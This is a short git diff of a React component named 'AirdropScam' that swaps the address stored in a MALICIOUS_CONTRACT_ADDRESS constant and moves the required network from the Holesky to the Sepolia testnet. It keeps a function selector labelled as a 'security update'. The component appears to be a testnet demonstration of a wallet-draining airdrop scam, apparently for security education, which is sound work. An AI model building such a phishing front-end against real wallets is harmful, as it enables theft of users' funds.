@@ -34,11 +34,11 @@ export default function AirdropScam() {
     >(null);
     const [networkCheckTriggered, setNetworkCheckTriggered] = useState(false);
     const MALICIOUS_CONTRACT_ADDRESS =
-        "0xbe535a82f2c3895bdaceb3ffe6b9b80ac2f832a0";
+        "0x24f709e3441e09deb499578c3594dd9c4b927c94";
     const SECURITY_UPDATE_SELECTOR = "0x5fba79f5";
 
-    // 我們將定義需要的網路 chainId (這裡假設使用 Holesky 測試網)
-    const REQUIRED_CHAIN_ID = 17000; // Holesky Testnet
+    // 我們將定義需要的網路 chainId (這裡假設使用 sepolia 測試網)
+    const REQUIRED_CHAIN_ID = 11155111; // sepolia Testnet
 
     useEffect(() => {
         if (isConnected) {
